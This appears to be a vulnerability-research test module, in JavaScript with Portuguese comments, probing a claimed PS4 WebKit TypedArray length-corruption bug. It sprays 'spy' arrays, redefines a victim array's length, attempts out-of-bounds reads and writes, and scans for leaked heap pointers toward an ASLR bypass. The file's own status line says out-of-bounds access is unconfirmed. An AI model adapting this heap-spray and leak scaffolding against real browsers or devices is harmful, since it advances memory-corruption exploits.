/**
 * TEST: TypedArray Length Corruption — PROOF OF CONCEPT
 * CORRIGIDO: Só dispara com OOB real, ignora length change cosmético
 * 
 * VULNERABILIDADE: PS4 13.50 WebKit permite modificar .length de TypedArray
 * STATUS: Length corruption confirmado, OOB requer validação adicional
 * 
 * IMPACTO POTENCIAL:
 * - Leitura Out-of-Bounds (Info Leak)
 * - Escrita Out-of-Bounds (Memory Corruption)  
 * - Potencial Remote Code Execution
 */

export const testTypedarrayLengthCorruptionPoc = {
    id: 'TYPEDARRAY_LENGTH_CORRUPTION_POC',
    name: '⚠️ Length Corruption PoC',
    risk: 'CRITICAL',
    category: 'TYPES',
    description: 'CONFIRMADO: Object.defineProperty modifica .length. Testa OOB real.',
    ps4Compatible: true,
    
    setup: function() {
        this.CHUNK_SIZE = 16;
        this.SPRAY_COUNT = 100;
        
        // Array vítima
        this.victimArray = new Uint32Array(this.CHUNK_SIZE);
        for (let i = 0; i < this.CHUNK_SIZE; i++) {
            this.victimArray[i] = 0xDEAD0000 + i;
        }
        
        // Array espião (alocado após a vítima no heap)
        this.spyArrays = [];
        for (let i = 0; i < this.SPRAY_COUNT; i++) {
            const arr = new Uint32Array(this.CHUNK_SIZE);
            arr.fill(0xBBBB0000 + i);
            this.spyArrays.push(arr);
        }
        
        // Flags de exploração
        this.lengthCorrupted = false;
        this.oobReadConfirmed = false;
        this.oobWriteConfirmed = false;
        this.leakedSpyData = null;
        this.leakedPointerCandidate = null;
        this.exploitationSteps = [];
        this.anyOobDetected = false;
    },
    
    probe: [
        // Probe 0: OOB detectado? (0=Não, 1=Sim — IGNORA length change)
        function(scenario) {
            return scenario.anyOobDetected ? 1 : 0;
        },
        
        // Probe 1: ByteLength real do buffer
        function(scenario) {
            return scenario.victimArray?.buffer?.byteLength ?? -1;
        },
        
        // Probe 2: Tentativa de leitura OOB (posição 20)
        function(scenario) {
            try {
                const val = scenario.victimArray[20];
                if (val !== undefined) {
                    scenario.oobReadConfirmed = true;
                    scenario.anyOobDetected = true;
                    return val;
                }
                return -1;
            } catch (e) {
                return -2;
            }
        },
        
        // Probe 3: Tentativa de escrita OOB (posição 20)
        function(scenario) {
            try {
                scenario.victimArray[20] = 0x41414141;
                const after = scenario.victimArray[20];
                
                if (after === 0x41414141) {
                    scenario.oobWriteConfirmed = true;
                    scenario.anyOobDetected = true;
                    scenario.exploitationSteps.push('OOB_WRITE_SUCCESS');
                    return 1;
                }
                return 0;
            } catch (e) {
                return -1;
            }
        },
        
        // Probe 4: Scan de memória OOB (procura padrões conhecidos)
        function(scenario) {
            try {
                const found = [];
                const maxScan = Math.min(scenario.victimArray.length, 100);
                
                for (let i = 16; i < maxScan; i++) {
                    const val = scenario.victimArray[i];
                    if (val === undefined) continue;
                    
                    // Procura por padrões de spy arrays (0xBBBBxxxx)
                    if ((val & 0xFFFF0000) === 0xBBBB0000) {
                        found.push({
                            index: i,
                            type: 'SPY_DATA',
                            value: '0x' + val.toString(16),
                            spyIndex: val & 0x0000FFFF
                        });
                        scenario.leakedSpyData = found;
                        scenario.anyOobDetected = true;
                    }
                    
                    // Procura por possíveis ponteiros
                    if (val > 0x100000 && val < 0x7FFFFFFF && (val & 0x3) === 0) {
                        found.push({
                            index: i,
                            type: 'POSSIBLE_POINTER',
                            value: '0x' + val.toString(16)
                        });
                        scenario.leakedPointerCandidate = '0x' + val.toString(16);
                        scenario.anyOobDetected = true;
                    }
                }
                return found.length;
            } catch (e) {
                return -1;
            }
        },
        
        // Probe 5: Verifica se spy arrays foram corrompidos
        function(scenario) {
            try {
                const corrupted = [];
                for (let i = 0; i < scenario.spyArrays.length; i++) {
                    const arr = scenario.spyArrays[i];
                    if (arr && arr[0] !== (0xBBBB0000 + i)) {
                        corrupted.push({
                            index: i,
                            expected: '0x' + (0xBBBB0000 + i).toString(16),
                            actual: '0x' + arr[0].toString(16)
                        });
                        scenario.anyOobDetected = true;
                    }
                }
                return corrupted.length;
            } catch (e) {
                return -1;
            }
        }
    ],
    
    trigger: function() {
        this.exploitationSteps = [];
        this.oobReadConfirmed = false;
        this.oobWriteConfirmed = false;
        this.anyOobDetected = false;
        
        // PASSO 1: Corromper o length
        try {
            this.exploitationSteps.push('STEP1: Attempting defineProperty...');
            Object.defineProperty(this.victimArray, 'length', {
                value: 1000000,
                writable: true,
                configurable: true
            });
            
            if (this.victimArray.length === 1000000) {
                this.exploitationSteps.push('STEP1: SUCCESS - length = ' + this.victimArray.length);
                this.lengthCorrupted = true;
            } else {
                this.exploitationSteps.push('STEP1: FAILED - length = ' + this.victimArray.length);
            }
        } catch (e) {
            this.exploitationSteps.push('STEP1: ERROR - ' + e.message);
        }
        
        // PASSO 2: Se length foi corrompido, tentar leitura OOB
        if (this.lengthCorrupted) {
            try {
                this.exploitationSteps.push('STEP2: Attempting OOB read...');
                
                const oobReads = [];
                for (let i = 16; i < 50; i++) {
                    const val = this.victimArray[i];
                    if (val !== undefined) {
                        oobReads.push({ index: i, value: '0x' + val.toString(16) });
                    }
                }
                
                if (oobReads.length > 0) {
                    this.exploitationSteps.push(`STEP2: SUCCESS - ${oobReads.length} OOB reads`);
                    this.exploitationSteps.push(`STEP2: First reads: ${JSON.stringify(oobReads.slice(0, 5))}`);
                    this.oobReadConfirmed = true;
                    this.anyOobDetected = true;
                } else {
                    this.exploitationSteps.push('STEP2: Length changed but OOB reads returned undefined');
                }
            } catch (e) {
                this.exploitationSteps.push('STEP2: ERROR - ' + e.message);
            }
        }
        
        // PASSO 3: Tentar escrita OOB
        if (this.lengthCorrupted) {
            try {
                this.exploitationSteps.push('STEP3: Attempting OOB write...');
                
                for (let i = 20; i < 25; i++) {
                    this.victimArray[i] = 0x13371337;
                }
                
                const verify = this.victimArray[20];
                if (verify === 0x13371337) {
                    this.exploitationSteps.push('STEP3: SUCCESS - OOB write confirmed!');
                    this.oobWriteConfirmed = true;
                    this.anyOobDetected = true;
                    
                    // Verifica se corrompeu spy arrays
                    const corruptedSpies = [];
                    for (let i = 0; i < this.spyArrays.length; i++) {
                        if (this.spyArrays[i] && this.spyArrays[i][0] !== (0xBBBB0000 + i)) {
                            corruptedSpies.push(i);
                        }
                    }
                    
                    if (corruptedSpies.length > 0) {
                        this.exploitationSteps.push(`STEP3: !!! SPY ARRAY CORRUPTION - ${corruptedSpies.length} arrays afetados`);
                    }
                } else {
                    this.exploitationSteps.push('STEP3: Write did not persist');
                }
            } catch (e) {
                this.exploitationSteps.push('STEP3: ERROR - ' + e.message);
            }
        }
        
        // GC
        if (typeof gc === 'function') {
            gc();
        }
    },
    
    cleanup: function() {
        this.victimArray = null;
        this.spyArrays = null;
    },
    
    customValidator: function(baseResults, afterResults) {
        const findings = [];
        
        // 1. OOB read confirmado?
        if (this.oobReadConfirmed) {
            findings.push({
                severity: 'CRITICAL',
                finding: 'OOB_READ',
                detail: 'Leitura além do buffer confirmada',
                impact: 'Vazamento de memória heap - possível info leak de ponteiros/dados'
            });
        }
        
        // 2. OOB write confirmado?
        if (this.oobWriteConfirmed) {
            findings.push({
                severity: 'CRITICAL',
                finding: 'OOB_WRITE',
                detail: 'Escrita além do buffer confirmada',
                impact: 'Corrupção de memória heap - possível RCE'
            });
        }
        
        // 3. Dados vazados encontrados?
        if (this.leakedSpyData && this.leakedSpyData.length > 0) {
            findings.push({
                severity: 'HIGH',
                finding: 'SPY_DATA_LEAK',
                detail: `${this.leakedSpyData.length} spy arrays identificados via OOB read`,
                impact: 'Confirmação de info leak - dados de objetos adjacentes vazados'
            });
        }
        
        // 4. Possíveis ponteiros?
        if (this.leakedPointerCandidate) {
            findings.push({
                severity: 'CRITICAL',
                finding: 'POINTER_LEAK',
                detail: `Possível ponteiro vazado: ${this.leakedPointerCandidate}`,
                impact: 'ASLR bypass - ponteiro de heap vazado'
            });
        }
        
        // 5. Spy arrays corrompidos?
        if (afterResults[5] > 0) {
            findings.push({
                severity: 'CRITICAL',
                finding: 'HEAP_CORRUPTION',
                detail: `${afterResults[5]} spy arrays corrompidos pela escrita OOB`,
                impact: 'Confirmação de corrupção de memória entre objetos'
            });
        }
        
        if (findings.length > 0) {
            return {
                anomaly: true,
                reason: `💥💥💥 VULNERABILIDADE CONFIRMADA: ${findings.length} findings\n${findings.map(f => `   ${f.severity}: ${f.finding} — ${f.detail}\n   Impacto: ${f.impact}`).join('\n')}`
            };
        }
        
        // Se length mudou mas NADA de OOB = NÃO é anomalia
        return { anomaly: false, reason: '' };
    }
};
